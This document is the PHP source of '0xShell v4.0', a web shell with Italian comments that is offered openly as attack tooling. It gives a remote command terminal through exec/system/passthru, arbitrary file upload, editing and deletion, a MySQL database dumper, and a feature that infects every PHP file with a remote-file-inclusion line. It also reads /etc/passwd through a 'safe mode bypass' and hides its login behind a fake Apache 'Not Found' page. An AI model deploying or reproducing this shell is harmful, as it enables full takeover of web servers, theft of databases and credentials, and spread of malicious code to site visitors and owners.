<?php
session_start();
set_time_limit(0);

/* *
 * 
 * 0xShell ~ http://0xproject.netsons.org/#0xShell
 *
 * Autore: KinG-InFeT [ http://www.kinginfet.net/ ]
 * Licenza: GNU/GPL
 * Versione: v4.0
 *
 *
 *  Release pubblicata il: 22/01/2012
 *
 *
 * */ 
 
 /* *
  *
  * CHANGELOG_
  *
  *
  *	 v4.0
  *     [+] Sostituiti tutti i link del progetto al nuovo host
  *     [+] Sistemato il "Torna Indietro" nelle directory
  *     [+] Migliorata la funzione check_extenction()
  *     [+] Migliorato il View File()
  *     [+] Aggiunto link diretto alla root ( / )
  *     [+] Aggiunto tempo di generazione pagina
  *     [+] Allargato l'intero layout
  *     [+] Sistemata la funzione di upload
  *     [+] Completamente revisionato l'intero codice
  *
  *	 v3.0
  *     [+] Utilizzo Semplificato
  *     [+] Migliorate tutte le funzionalità
  *     [+] Aggiunta visualizzazione della grandezza file (B, KB, MB, GB)
  *     [+] Aggiunta funzione per il Download dei file
  *     [+] Migliorata la funzione CHMOD per i permessi
  *     [+] Aggiunto Login con password di accesso "nascosta"
  *     [+] Sistemata la visualizzazione del phpinfo()
  *     [+] Fixato problema degli spazzi in nomi file e directory!
  *     [+] Aggiunta funzione per visualizzare le variabili del file php.ini
  *     [+] Aggiunta funzione di HEXDUMP per qualsiasi file
  *     [+] Fixato un problema per la visualizzazione dei file
  *     [+] Fixato errore nella funzione mkdir (non calcolava la directory corrente)
  *     [+] Fixato errore in rmdir (non calcolava la directory corrente)
  *     [+] Fixato errore nella funzione di upload di file (non calcolava la directory corrente)
  *     [+] Fixato problema nel mysql-dump del database (il file scaricato incorporava anche il codice della pagina web)
  *     [+] Migliorata la funzione del MySQL-Dump
  *     [+] Fixate 2 falle di tipo XSS
  *     [+] Revisionato e identato per bene l'intero sorgente
  *
  *  v2.0
  *     [+] Rivista l'intera identazione del codice
  *     [+] Aggiunta colorazione della sintassi durante la visualizzazione del codice di una pagina
  *     [+] Sistemato il Footer
  *     [+] Fixed XSS in $patch variable
  *     [+] Aggiunta possibilità di uplodare un qualsiasi file
  *     [+] Aggiunto il terminale Linux (Thanks C99 Shell ♥)
  *     [+] Aggiunta la possibilità di Chmoddare un file o una directory tramite la funzione chmod()
  *     [+] Fixato il problema nelle informazioni ( se exec non esiste? xd)
  *     [+] Aggiunto il Dumper per i database MySQL
  *     [+] Aggiunta la funzione per inniettare codice PHP in ogni file cosìda infettarli con una RFI o altro
  *     [+] Aggiunto il controllo sui Magic Quotes
  *     [+] Aggiunto il Safe_Mode ByPass con lettura del /etc/passwd file :D
  *     [+] Identata e commentata tutta la pagina :D
  *
  *  v1.0
  *     [+] Possibilità di navigare tra i vari file e directory
  *     [+] Possibilità di eliminare file
  *     [+] Possibilità di eliminare directory
  *     [+] Possibilità di editare un file
  *     [+] Possibilità di creare una directory
  *     [+] Possibilità di visionare il phpinfo()
  *     [+] Possibilità di visualizzare il contenuto di un file
  *     [+] Possibilità di visionare i permessi su directory e file sia in stile UNIX che in stile Numerico
  *     [+] Inserite molte informazioni riguardante il server poste in alto
  *     [+] Possibilità di effettuare un whois dell'IP del server in cui risiede la shell
  *
  * */

//versione
define("VERSION","4.0");

//            -LOGIN-
//Settare solo se si vuole attivare il login
//  1 = attivo
//  0 = disattivo
//
$login = 0;
//
//  Password default = root = 63a9f0ea7bb98050796b649e85481845
$password = "63a9f0ea7bb98050796b649e85481845";
//---------------------

if($login == 1)
	$_SESSION['login'] = "activate";
else
	$_SESSION['login'] = 1;

if(@$_SESSION['login'] == "activate") {

	if(empty($password))
		die("[ERROR] Setting Password for Login.");
		
	if(@$_GET['send'] == 1)
		if(md5(@$_POST['pass']) == $password)
			$_SESSION['login_0xShell'] = $password;
		else
			$_SESSION['login_0xShell'] = NULL;
}

if(@$_SESSION['login'] == "activate")
	if(@$_SESSION['login_0xShell'] != $password)
		die('<h1>Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>Apache Server at Port 80</address><style>input { margin:0;background-color:#fff;border:1px solid #fff; }</style><form method="POST" action="?send=1"><input type="password" name="pass"></form>');

//            - END LOGIN-

@$patch       = htmlspecialchars($_SERVER['PHP_SELF']);
@$dir         = (isset($_REQUEST['dir'])) ? htmlspecialchars($_REQUEST['dir']) : getcwd();
@$remove_file = $_GET['remove_file'];
@$view_file   = $_GET['view_file'];
@$edit_file   = $_GET['edit_file'];
@$down_file   = $_GET['download_file'];
@$hexdump	  = $_GET['hexdump_file'];
@$rmdir       = $_GET['rmdir'];
@$action      = $_GET['action'];
@$cmd         = $_REQUEST['cmd'];

//funzione che restituisce la funzione TIME() UNIX
function getTime() {
    list($usec, $sec) = explode(" ", microtime());
    return ((float)$usec + (float)$sec);
}

define("startTime",getTime());

//controllo login attivo
function check_login($login) {

	if ($login == 0)
		$active = "<font color='red'>OFF</font>";
	else
		$active = "<font color='green'>ON</font>";
		
	return $active;
}

//controlla se il safe_mode è attivo oppure no
function check_safe_mode() {
	if (ini_get('safe_mode') == FALSE)
		$safemode = "<font color='green'>OFF</font>";
	else
		$safemode = "<font color='red'>ON</font>";
	return $safemode;
}

//controlla se il get_magic_quotes_gpc() è attivo oppure no
function check_magic_quotes_gpc() {
	if ((get_magic_quotes_gpc() == 1) || (get_magic_quotes_gpc() == "on"))
		$magic_quotes = "<font color='red'>ON</font>";
	else
		$magic_quotes = "<font color='green'>OFF</font>";
	return $magic_quotes;
}

function view_perms_color($file) {
	if (!is_readable($file))
		return "<font color=red>".get_perms($file,1)."</font>";
	else
		if (!is_writable($file)) 
			return "<font color=green>".get_perms($file,1)."</font>";
	else
		return "<font color=#4C83AF>".get_perms($file,1)."</font>";
}

function parse_perms($mode) {
      if (($mode & 0xC000) === 0xC000)
		$t = "s";
      else
		if (($mode & 0x4000) === 0x4000)
			$t = "d";
      else
		if (($mode & 0xA000) === 0xA000)
			$t = "l";
      else
		if (($mode & 0x8000) === 0x8000)
			$t = "-";
      else
		if (($mode & 0x6000) === 0x6000)
			$t = "b";
      else
		if (($mode & 0x2000) === 0x2000)
			$t = "c";
      else
		if (($mode & 0x1000) === 0x1000)
			$t = "p";
      else
		$t = "?";
		
      $o["r"] = ($mode & 00400) > 0; 
	  $o["w"] = ($mode & 00200) > 0; 
	  $o["x"] = ($mode & 00100) > 0;
	  
      $g["r"] = ($mode & 00040) > 0; 
	  $g["w"] = ($mode & 00020) > 0; 
	  $g["x"] = ($mode & 00010) > 0;
	  
      $w["r"] = ($mode & 00004) > 0; 
	  $w["w"] = ($mode & 00002) > 0; 
	  $w["x"] = ($mode & 00001) > 0;
	  
      return array( "t" => $t,
					"o" => $o,
					"g" => $g,
					"w" => $w
				);
}

//fa il controllo dei permessi e ne restituisce il valore
function get_perms($file,$type) {
	switch($type) {
		case 1;
			$mode  = fileperms($file);
			$perms = NULL;
			$perms .= ($mode & 00400) ? 'r' : '-';
			$perms .= ($mode & 00200) ? 'w' : '-';
			$perms .= ($mode & 00100) ? 'x' : '-';
			$perms .= ($mode & 00040) ? 'r' : '-';
			$perms .= ($mode & 00020) ? 'w' : '-';
			$perms .= ($mode & 00010) ? 'x' : '-';
			$perms .= ($mode & 00004) ? 'r' : '-';
			$perms .= ($mode & 00002) ? 'w' : '-';
			$perms .= ($mode & 00001) ? 'x' : '-';
		break;
		
		case 2;
			$perms = substr(sprintf('%o', fileperms($file)), -4);
		break;
	}
	
return $perms;
}

//delete a Directory
function del_dir($dirname) {
	if(is_dir($dirname)){
		$handle = opendir($dirname);
		
		while (FALSE !== ($file = readdir($handle)))
			if(is_file($dirname.$file))
				unlink($dirname.$file);
				
		$handle = closedir($handle);
		if(rmdir($dirname))
			return TRUE;
		else
			return FALSE;
	}else
		return FALSE;
}

//Thanks C99 Shell :P
function cmd($cmd) {
	$result = "";
	
	if (!empty($cmd)) {
		if (is_callable("exec")) {
			exec($cmd,$result); 
			$result = join("\n",$result);
		}
	elseif (($result = `$cmd`) !== FALSE) {
				//:S
			}
	elseif (is_callable("system")) {
			$v = @ob_get_contents(); 
			@ob_clean(); 
			system($cmd); 
			$result = @ob_get_contents(); 
			@ob_clean(); 
			print $v;
		}
	elseif (is_callable("passthru")) {
			$v = @ob_get_contents(); 
			@ob_clean(); 
			passthru($cmd); 
			$result = @ob_get_contents(); 
			@ob_clean(); 
			print $v;
		}
	elseif (is_resource($fp = popen($cmd,"r"))) {
			$result = "";
			while(!feof($fp)) {
				$result .= fread($fp,1024);
			}
			pclose($fp);
		}
	}
	return $result;
}

//dumper per il MySQL
function _mysqldump($mysql_database) {
	$sql    = "SHOW TABLES;";
	$result = mysql_query($sql);
	
	if( $result) {
		while( $row = mysql_fetch_row($result)) {
			_mysqldump_table_structure($row[0]);

			if( isset($_REQUEST['sql_table_data']))
			    _mysqldump_table_data($row[0]);
		}
	}else
		print "/* no tables in $mysql_database */\n";
		
	mysql_free_result($result);
}

function _mysqldump_table_structure($table) {

	print "/* Table structure for table `$table` */\n";
	
	if( isset($_REQUEST['sql_drop_table']))
		print "DROP TABLE IF EXISTS `$table`;\n\n";
		
	if( isset($_REQUEST['sql_create_table'])) {

		$sql    = "SHOW CREATE TABLE `$table`; ";
		$result = mysql_query($sql);
		
		if( $result)
			if($row = mysql_fetch_assoc($result))
				print $row['Create Table'].";\n\n";

		mysql_free_result($result);
	}
}

function _mysqldump_table_data($table) {

	$sql    = "SELECT * FROM `$table`;";
	$result = mysql_query($sql);
	if( $result) {
		$num_rows   = mysql_num_rows($result);
		$num_fields = mysql_num_fields($result);

		if( $num_rows > 0) {
			print "/* dumping data for table `$table` */\n";

			$field_type = array();
			$i = 0;
			
			while( $i < $num_fields) {
				$meta = mysql_fetch_field($result, $i);
				array_push($field_type, $meta->type);
				$i++;
			}

			print "INSERT INTO `$table` VALUES\n";
			$index = 0;
			while( $row = mysql_fetch_row($result)) {
				print "(";
				for( $i=0; $i < $num_fields; $i++) {
					if( is_null( $row[$i])) {
						print "null";
					}else{
						switch( $field_type[$i]) {
							case 'int':
								print $row[$i];
							break;
							case 'string':
							case 'blob' :
							default:
								print "'".mysql_real_escape_string($row[$i])."'";
						}
					}
					if( $i < $num_fields-1)
						print ",";
				}
				print ")";
						if( $index < $num_rows-1)
					print ",";
				else
					print ";";
				print "\n";

				$index++;
			}
		}
	}
	mysql_free_result($result);
	print "\n";
}

//Test per la connessione al MySQL
function _mysql_test($mysql_host,$mysql_database, $mysql_username, $mysql_password) {
	global $output_messages;
	
	$link = mysql_connect($mysql_host, $mysql_username, $mysql_password);
	if (!$link) {
	   array_push($output_messages, 'Could not connect: ' . mysql_error());
	}else{
		array_push ($output_messages,"Connected with MySQL server: <b>".$mysql_username."@".$mysql_host."</b> <font color=\"green\">Successfully</font>");
		
		$db_selected = mysql_select_db($mysql_database, $link);
		if (!$db_selected)
			array_push ($output_messages,'Can\'t use <b>'.$mysql_database.'</b> : ' . mysql_error());
		else
			array_push ($output_messages,"Connected with MySQL database: <b>".$mysql_database."</b> <font color=\"green\">Successfully</font>");
	}

}

//Infetta tutti i file :P
function infect_all_files($code_infect) {

	foreach (glob($dir."*.php") as $file) {
		$dir  = '.';
		$open = fopen($file, 'a+');
		@fwrite($open, $code_infect);
		@fclose($open);
	}
	if($open)
		$text = '<font size=3 face=Verdana color=lightgreen>Infected!</font>';
	else
		$text = '<font size=1 face=Verdana color=red>Error (Bad Perms?)</font>';
		
	return $text;
}

//funzione per il safe_mode_bypass (lettura del /etc/passwd file :P
function safe_mode_bypass($file) {
	$test  = '';
	$tempp = tempnam($test, "cx");
	$get   = htmlspecialchars($file);
	if(copy("compress.zlib://".$get, $tempp)){
		$fopenzo = fopen($tempp, "r");
		$freadz  = fread($fopenzo, filesize($tempp));
		fclose($fopenzo);
		$source = htmlspecialchars($freadz);
		print "<center><font size='1' face='Verdana'>".$get."</font><br><textarea rows='20' cols='80' name='source'>".$source."</textarea></center>";
		unlink($tempp);
	} else {
		print "<center><font size='1' color='red' face='Verdana'>Error</font></center>";
	}
}

//funzione per il settaggio dei permessi (CHMOD)
function chmod_shell($file, $perms) {
	
	$check = chmod($file, $perms);
	
	if($check == TRUE)
		$control = "<center><font size='4' color='green' face='Verdana'>CHMOD [OK]</font></center>";
	else
		$control = "<center><font size='4' color='red' face='Verdana'>CHMOD [ERROR]</font></center>";
	
	return $control;
}

$print_form      = 1;
$output_messages = array();

?>
<html>
<head>
<title>0xShell v <?php print VERSION; ?></title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style type="text/css">
table {
	background-color: #000000;
	color: #FFFFFF;
	font-family: verdana;
	font-size: 10px;
	cursor: default;
	border-spacing: 1px;
	margin-left: auto;
	margin-right: auto;
	width: 90%;
	border-width: 1px;
	border:1px solid #333;
	padding: 10px;
}

input,textarea,select {
	font: normal 11px Verdana, Arial, Helvetica, sans-serif;
	background-color:black;
	color:#a6a6a6;
	border: solid 1px #363636;
}

a:link,a:visited,a:active {
	font-family: verdana;
	font-size: 10px;
	text-decoration: none;
	color: #FFFFFF;
}

pre {
	background-color: #666666;
	text-align: left;
	padding: 3px;
}

a:hover{
	color: #D3D3D3;
}
</style>
</head>
<body bgcolor='#000000' text='#ebebeb' link='#ebebeb' alink='#ebebeb' vlink='#ebebeb'>
<h2 align="center"><code><a href="<?php print $patch; ?>"><font size="4">[~]</font></a> 0xShell v <?php print VERSION; ?><blink>_</blink></code></h2>      

</div><br />
<table>
<tr><td>[~] Uname -a: <u>       <?php print php_uname("a"); ?></u></td></tr>
<tr><td>[~] Kernel Version: <u> <?php print php_uname("r"); ?></u></td></tr>
<tr><td>[~] Server Address: <u> <?php print $_SERVER['SERVER_ADDR']; ?></u></td></tr>
<tr><td>[~] Whois Server:       <?php print "<a href='http://whois.domaintools.com/".$_SERVER['SERVER_ADDR']."'>Click Here</a>"; ?></td></tr>
<tr><td>[~] Server Name: <u>    <?php print $_SERVER['SERVER_NAME']; ?></u></td></tr>
<tr><td>[~] Server Software: <u><?php print $_SERVER['SERVER_SOFTWARE']; ?></u></td></tr>
<tr><td>[~] Charset: <u>        <?php print $_SERVER['HTTP_ACCEPT_CHARSET']; ?></u></td></tr>
<tr><td>[~] IP Address: <u>     <?php print $_SERVER['REMOTE_ADDR']; ?></u></td></tr>
<tr><td>[~] User Agent: <u>     <?php print htmlspecialchars($_SERVER['HTTP_USER_AGENT']); ?></u></td></tr>
<tr><td>[~] Patch: <u>          <?php print $_SERVER['DOCUMENT_ROOT']; ?></u></td></tr>
<tr><td>[~] Safe Mode:          <?php print check_safe_mode(); ?></td></tr>
<tr><td>[~] Magic Quotes GPC:   <?php print check_magic_quotes_gpc(); ?></td></tr>
<tr><td>[~] Login Access:       <?php print check_login($login); ?> - Password: <?php print $password; ?></td></tr>
</table>
<p></p>
<div align="center">
<!-- menu -->
-
<a href="?" >[File Manager]</a> - 
<a href="?action=phpinfo" target="_blank">[PHP-Info]</a> - 
<a href="?action=phpini" >[PHP.ini]</a> - 
<a href="?action=mkdir&dir=<?php print $dir; ?>">[Crea Directory]</a> - 
<a href="?action=upload&dir=<?php print $dir; ?>" >[Upload]</a> - 
<a href="?action=terminal" >[Terminal]</a> - 
<a href="?action=mysql_dump" >[MySQL Dumper]</a> - 
<a href="?action=infect_all_file" >[Infect All Files]</a> - 
<a href="?action=safe_mode_bypass" >[Safe Mode ByPass]</a> - 
<!-- end menu -->
<br /><br /><br />
<div align="center">
<?php
switch($action) {//varie azioni
	case 'phpinfo'; //visualizzo il phpinfo()
		@ob_clean();
		phpinfo();
		exit;
	break;
	
	case 'phpini':
		get_phpini();
	break;
	
	case 'mkdir';//crea una directory
		print "<form method=\"POST\" action=\"".$patch."?action=mkdir&dir=".$dir."&work=ok\" />\n";
		print "Directory Name: <input type='test' name='dir_name' /><br />\n";
		print "<input type='submit' value='Create' /></form>";
		
		if(@$_GET['work'] == 'ok') {
			if(mkdir($_GET['dir']."/".$_POST['dir_name']))
				print "<script>alert('Directory Created'); window.location=\"".$patch."?dir=".$dir."\";</script>";
			else
				print "<script>alert('Directory Not Created'); window.location=\"".$patch."?dir=".$dir."\";</script>";
		}
	break;
	
	case 'terminal':	
		print "\n<form method=\"POST\" action=\"".$patch."?action=terminal\" />"
		    . "\nCommand: <input type=\"text\" name=\"cmd\" />"
		    . "\n<input type=\"submit\" name=\"submit\" value=\"Send\" />";
		
		if(@$_POST['submit']) {
			$ret  = cmd($cmd);
			$ret  = convert_cyr_string($ret,"d","w");
			$rows = count(explode("\r\n",$ret)) + 1;
			
			if ($rows < 10)
                $rows = 20;
				
			print "<br /><br /><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
		}
	break;
	
	case 'upload':
		
		print "\n<form method=\"POST\" action=\"".$patch."?action=upload&dir=".$dir."\" enctype=\"multipart/form-data\">"
			. "\n<input type=\"file\" name=\"file\"><br /><br />"
		    . "\n<input type=\"submit\" name=\"send_upload\" value=\"Upload\">"
		    . "\n</form>";
		    
		if(@$_POST['send_upload']) {
		
			$temp = $_FILES ['file'] ['tmp_name'];
			
            $file = $dir ."/". $_FILES ['file'] ['name'];
		    
		    if (move_uploaded_file ($temp , $file))
		        print "<font color=\"green\">Upload eseguito con successo</font>";
		    else
		        print "<font color=\"red\">[ERROR] Upload del file non eseguito correttamente. <br /> [DEBUG] return: ".$_FILES['miofile']['error']."</font>";
		}
	break;
	
	case 'mysql_dump':
	
		if( isset($_REQUEST['action']) ) {
			$mysql_host     = @$_REQUEST['mysql_host'];
			$mysql_database = @$_REQUEST['mysql_database'];
			$mysql_username = @$_REQUEST['mysql_username'];
			$mysql_password = @$_REQUEST['mysql_password'];
		
			if( 'Test Connection' == $_REQUEST['action'])
				_mysql_test($mysql_host,$mysql_database, $mysql_username, $mysql_password);
			else if( 'Export' == $_REQUEST['action']) {
				_mysql_test($mysql_host,$mysql_database, $mysql_username, $mysql_password);
				if( 'SQL' == $_REQUEST['output_format'] ) {
					$print_form = 0;
					@ob_clean();
					header('Content-type: text/plain');
					header('Content-Disposition: attachment; filename="'.$mysql_host."_".$mysql_database.'_.sql"');
					print "/* MySQL-Dumper 0xShell v".VERSION." ~ http://0xproject.netsons.org/#0xShell */\n";
					_mysqldump($mysql_database);
					exit;
				}
			}
		}
		
		if( $print_form > 0 ) {
		?>
		<body>
		<?php
			foreach ($output_messages as $message)
		    	print $message."<br />";
		?>
		<form action="<?php print $patch."?action=mysql_dump"; ?>" method="POST">
		MySQL connection parameters:
		<table border="0">
		  <tr>
		    <td>Host:</td>
		    <td><input  name="mysql_host" value="<?php if(isset($_REQUEST['mysql_host'])) print $_REQUEST['mysql_host']; else print 'localhost';?>"  /></td>
		  </tr>
		  <tr>
		    <td>Database:</td>
		    <td><input  name="mysql_database" value="<?php print @$_REQUEST['mysql_database']; ?>"  /></td>
		  </tr>
		  <tr>
		    <td>Username:</td>
		    <td><input  name="mysql_username" value="<?php print @$_REQUEST['mysql_username']; ?>"  /></td>
		  </tr>
			  <tr>
		    <td>Password:</td>
		    <td><input  type="password" name="mysql_password" value="<?php print @$_REQUEST['mysql_password']; ?>"  /></td>
		  </tr>
		  <tr>
	    <td>Output format: </td>
		    <td>
		      <select name="output_format" >
		        <option value="SQL" <?php if( isset($_REQUEST['output_format']) && 'SQL' == $_REQUEST['output_format']) print "selected";?> >SQL</option>
		        <option value="CSV" <?php if( isset($_REQUEST['output_format']) && 'CSV' == $_REQUEST['output_format']) print "selected";?> >CSV</option>
		        </select>
		    </td>
		  </tr>
	</table>
		<input type="submit" name="action"  value="Test Connection"><br />
		  <br>Dump options(SQL):
		  <table border="0">
		    <tr>
		      <td>Drop table statement: </td>
		      <td><input type="checkbox" name="sql_drop_table" <?php if(isset($_REQUEST['action']) && ! isset($_REQUEST['sql_drop_table'])) ; else print 'checked' ?> /></td>
			    </tr>
		    <tr>
		      <td>Create table statement: </td>
		      <td><input type="checkbox" name="sql_create_table" <?php if(isset($_REQUEST['action']) && ! isset($_REQUEST['sql_create_table'])) ; else print 'checked' ?> /></td>
		    </tr>
		    <tr>
		      <td>Table data: </td>
		      <td><input type="checkbox" name="sql_table_data"  <?php if(isset($_REQUEST['action']) && ! isset($_REQUEST['sql_table_data'])) ; else print 'checked' ?>/></td>
		    </tr>
		  </table>
		<input type="submit" name="action"  value="Export"><br />
		</form>
		<?php
		}
		break;
		
		case 'infect_all_file':
			if(@$_GET['inject'] && !empty($_POST['code_inject'])) {
				infect_all_files($_POST['code_infect']);
			}else{
				print "<form method='post' action='".$patch."?action=infect_all_file'>\n"
					. "<textarea name='cod3inf' cols=50 rows=4>\n"
					. "<?php include(\$GET['0xShell_RFI']); ?>\n"
					. "</textarea>\n"
					. "<br /><input type='submit' value='Infect All Files!' name='inf3ct'><br />\n";
			}
		break;
		
		case 'safe_mode_bypass':
			print "<form action='".$patch."?action=safe_mode_bypass' method='POST'>\n"
				. "File Name: <input type='text' name='filew' value='/etc/passwd'><br />\n"
				. "<input type='submit' value='Read File' name='red_file'>\n"
				. "</form>\n";
			if(isSet($_POST['red_file']))
				if(empty($_POST['filew']))
					die("[ERROR] Enter the name file.");
				else
					safe_mode_bypass($_POST['filew']);
		break;
		
		case 'chmod':
				
				$perms = parse_perms(fileperms($_GET['file']));
				
				print "<form action=\"".$patch."?action=chmod&file=".htmlspecialchars($_GET['file'])."\" method=\"POST\">
				<h3 align=\"center\">Chmod File: <i>".htmlspecialchars($_GET['file'])." - (".view_perms_color($_GET['file']).")</i></h3><br />
				<table align=center width=300 border=0 cellspacing=0 cellpadding=5>
				<tr><td><b>Owner</b><br><br>
				    <input type=checkbox NAME='chmod_o_r' value=1".($perms["o"]["r"] ? " checked" : "").">Read
				<br><input type=checkbox name='chmod_o_w' value=1".($perms["o"]["w"] ? " checked" : "").">Write
				<br><input type=checkbox NAME='chmod_o_x' value=1".($perms["o"]["x"] ? " checked" : "").">eXecute</td>
				<td><b>Group</b><br><br>				
				    <input type=checkbox NAME='chmod_g_r' value=1".($perms["g"]["r"] ? " checked" : "").">Read
				<br><input type=checkbox NAME='chmod_g_w' value=1".($perms["g"]["w"] ? " checked" : "").">Write
				<br><input type=checkbox NAME='chmod_g_x' value=1".($perms["g"]["x"] ? " checked" : "").">eXecute
				</font></td>				
				<td><b>World</b><br><br>
				    <input type=checkbox NAME='chmod_w_r' value=1".($perms["w"]["r"] ? " checked" : "").">Read
				<br><input type=checkbox NAME='chmod_w_w' value=1".($perms["w"]["w"] ? " checked" : "").">Write
				<br><input type=checkbox NAME='chmod_w_x' value=1".($perms["w"]["x"] ? " checked" : "").">eXecute
				</font></td></tr><tr><td>
				<input type='submit' name='chmod_edit' value='Save'>
				</td></tr>
				</table>
				</form>";
				
			if(isSet($_POST['chmod_edit'])) {
				$perms_final = "0".base_convert((@$_POST['chmod_o_r'] ? 1 : 0).
												(@$_POST['chmod_o_w'] ? 1 : 0).
												(@$_POST['chmod_o_x'] ? 1 : 0).
												
												(@$_POST['chmod_g_r'] ? 1 : 0).
												(@$_POST['chmod_g_w'] ? 1 : 0).
												(@$_POST['chmod_g_x'] ? 1 : 0).
												
												(@$_POST['chmod_w_r'] ? 1 : 0).
												(@$_POST['chmod_w_w'] ? 1 : 0).
												(@$_POST['chmod_w_x'] ? 1 : 0), 2, 8);
										
				print chmod_shell($_GET['file'], $perms_final);
			}
		break;
				
}

if(isset($remove_file)) {  //Rimozione file

	if(!(is_writable($remove_file)))
		die("File Not Deleted");
		
	if(unlink($remove_file))
		print "<script>alert('File Deleted'); location.href='".$patch."';</script>";
	else
		print "<script>alert('File Not Deleted'); location.href='".$patch."';</script>";
}

function check_extenction($file) {

    $ext = explode( ".", $file);
    return strtoupper( $ext[ count( $ext ) - 1 ] );

}

if(isset($view_file)) {  //view file
	if(!(is_readable($view_file))) {
		die("File Not View");
	}else{
		print "View File: <b>".$view_file."</b><br />\n";
		print "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: #c0c0c0; text-align: left;\">\n";
		
		if(check_extenction($view_file) == "php")
			print htmlspecialchars(highlight_file($view_file)) ."\n";
		else
			print "<pre>".htmlspecialchars(highlight_file($view_file))."</pre>\n";
			
		print "</div>\n";
	}
}

if(isset($edit_file)) {  //editing file :D

	if(!(is_writable($edit_file)))
		die("File Not Writable");
		
	$text = htmlspecialchars(join(file($edit_file)));

	print "<center>";
	print "<form method=\"POST\" action=\"".$file."?edit_file=".$edit_file."&work=yes \">";
	print "<textarea rows=\"30\" cols=\"150\" name=\"text\">".$text."</textarea>";
	print "<br /><input type=\"submit\" value=\"Edit File\">";
	print "</form></center>";
	
	if(@$_GET['work'] == 'yes') {
		if(file_exists($edit_file)) {
			$edit     = fopen($edit_file,'w+');
			$new_text = stripslashes($_POST['text']);
			fwrite($edit,$new_text);
			fclose($edit);
			print "<script>alert(\"File Edited Seccess\"); window.location=\"".$patch."\";</script>";
		}
	}
}

if(isset($rmdir)) {  //delete directory
	$rmdir = $rmdir."/";
	if(del_dir($rmdir) == TRUE)
		die("<script>alert('Directory Deleted'); window.location=\"".$patch."\";</script>");
	else
		die("<script>alert('[ERROR] Directory not Deleted'); window.location=\"".$patch."\";</script>");
}

if(isset($down_file)) {  //Download File
	if(file_exists($down_file)) {
		@ob_clean();
		header("Content-type: application/octet-stream");
		header("Content-length: ".filesize($down_file));
		header("Content-disposition: attachment; filename=\"".$down_file."\";");
		print file_get_contents($down_file);
		exit;
	}else
		print "File Not Exists!";
}

if(isSet($hexdump)) {
	
	if(empty($_GET['hexdump_file']))
		die("[ERROR] File name not inserit!");
	
	if(!file_exists($_GET['hexdump_file']))
		die("[ERROR] File not exists!");
	
	$f = $_GET['hexdump_file'];

	$fi = fopen($f,"rb");
	if ($fi) {
		print "<b>HEXDUMP</b>"; 
		$str = fread($fi,filesize($f));
		$n  = 0;
		$a0 = "00000000<br />";
		$a1 = "";
		$a2 = "";
		
		for ($i = 0; $i < strlen($str); $i++) {
			$a1 .= sprintf("%02X",ord($str[$i]))." ";
			switch (ord($str[$i])) {
				case  0:  
					$a2 .= "<font>0</font>"; 
				break;
				
				case 32:
				
				case 10:
				
				case 13: 
					$a2 .= "&nbsp;"; 
				break;
				
				default: 
					$a2 .= htmlspecialchars($str[$i]);
			}
			$n++;
			
			if ($n == 24) {
				$n = 0;
				
				if ($i + 1 < strlen($str))
					$a0 .= sprintf("%08X", $i + 1)."<br />";
	
				$a1 .= "<br />";
				$a2 .= "<br />";
			}
		}
		print "<table border=1 bgcolor=#666666>".
		  	  "<tr>".
			  "<td bgcolor=#666666>".$a0."</td>".
			  "<td bgcolor=#000000>".$a1."</td>".
			  "<td bgcolor=#000000>".$a2."</td>".
			  "</tr>".
			  "</table><br />";
	}	
}

function my_wordwrap($str) {
	$str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);
	return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
}

function check_value($value) {
    if ($value == '') 
		return '<i>no value</i>';
	
    if (@is_bool($value)) 
		return $value ? 'TRUE' : 'FALSE';
	
    if ($value === null) 
		return 'NULL';
	
    if (@is_object($value)) 
		$value = (array) $value;
		
	if (@is_array($value)) {
		@ob_start();
		print_r($value);
		$value = @ob_get_contents();
		@ob_end_clean();
    }
	
    return my_wordwrap((string) $value);
}

//visualizza tutte le variabili del file php.ini
function get_phpini() {
	if (@function_exists('ini_get_all')) {
		$r = "";
		print "<table><tr><td><div align=center>Directive</div></td><td><div align=center>Local Value</div></td><td><div align=center>Global Value</div></td></tr>";
		print "<tr><td><hr /></td><td><hr /></td><td><hr /></td></tr>";
		
		foreach (@ini_get_all() as $key => $value)
			$r .= "<tr><td>".$key."</td><td><div align=center>".check_value($value['local_value'])."</div></td><td><div align=center>".check_value($value['global_value'])."</div></td></tr>";
		
		print $r;
		print "</table>";
		print "<br /><br /><br /><br />";
	}else
		print "[ERROR] <i>ini_get_all</i> NOT ACTIVE!";
}

function view_size($size) {	//Visualizza La grandezza di un file

	if (!is_numeric($size))
		return "[Error]";
	else {
		if ($size >= 1073741824)
			$size = round($size/1073741824*100)/100 ." GB";
		else
			if ($size >= 1048576)
				$size = round($size/1048576*100)/100 ." MB";
		else
			if ($size >= 1024)
				$size = round($size/1024*100)/100 ." KB";
		else 
			$size = $size . " B";
			
		return $size;
	}
}
?>
</div>
</div>

<table>
<tr><td>File/Directory</td>
<td>Size</td>
<td>Permess</td>
<td>Action</td>
</tr>
<tr><td><hr></td>
<td><hr></td>
<td><hr></td>
<td><hr></td>
<td><hr></td></tr>
<?php

if (isset($_REQUEST['dir']))
    $path = htmlspecialchars($_REQUEST['dir']);
else
    $path = getcwd();

$dp = opendir($path) or die("Unable to open <b>".$path."</b><br>\n");

chdir($path);

$path = getcwd();

$dir = array();

while ($file = readdir($dp))
    if (strcmp(".",$file))
        array_push($dir,"$path/$file");

closedir($dp);

sort($dir);

print "\n<table>";

for ($i = 0; $i < count($dir); $i++) {
    print "<tr>\n";
    
    //UP Directory
    if (basename($dir[$i]) === "..") {
        $tmp = explode('/',getcwd());
        $new = "";

        for ($j = 0; $j < count($tmp) - 1; $j++)
            $new .= $tmp[$j]."/";

        print "<tr><td><a href=\"".$patch."?dir=".$new."\">UP</a></td></tr>\n";
    }
    
    print "</tr>\n";
    
    $perms_unix = get_perms($dir[$i],1);
	$perms_num  = get_perms($dir[$i],2);

    //è un FILE
	if(is_file($dir[$i])) {
        if (basename($dir[$i]) != '..') {
    		print "<tr><td><a href=\"".$patch."?view_file=".$dir[$i]."\">".$dir[$i]."</a></td>\n"
    			. "<td>".view_size(@filesize($dir[$i]))."</td>\n"
